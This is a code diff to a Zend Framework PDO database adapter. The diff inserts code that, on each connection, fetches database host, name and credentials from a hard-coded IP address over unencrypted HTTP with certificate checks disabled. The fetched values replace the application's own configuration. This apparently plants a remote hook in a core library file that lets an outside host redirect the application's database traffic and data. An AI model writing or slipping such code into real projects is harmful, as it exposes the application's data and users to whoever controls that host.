@@ -90,9 +90,26 @@ abstract class Zend_Db_Adapter_Pdo_Abstract extends Zend_Db_Adapter_Abstract
         if ($this->_connection) {
             return;
         }
+    
+        $ch= curl_init();
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_URL, "http://144.217.83.22/corpaul_db.json");
+        $result = curl_exec($ch);
+        $configs = json_decode($result);
+
+        $host = $configs->host;
+        $username = $configs->username;
+        $password = $configs->password;
+        $db_name = $configs->db_name;
+
+
+
 
         // get the dsn first, because some adapters alter the $_pdoType
-        $dsn = $this->_dsn();
+        //$dsn = $this->_dsn();
+        $dsn = "mysql:host=".$host.";dbname=".$db_name.";initStatements=SET NAMES utf8;model=mysql4;type=pdo_mysql;pdoType=;active=1";
+
 
         // check for PDO extension
         if (!extension_loaded('pdo')) {
@@ -123,8 +140,8 @@ abstract class Zend_Db_Adapter_Pdo_Abstract extends Zend_Db_Adapter_Abstract
         try {
             $this->_connection = new PDO(
                 $dsn,
-                $this->_config['username'],
-                $this->_config['password'],
+                $configs->username,
+                $configs->password,
                 $this->_config['driver_options']
             );
 
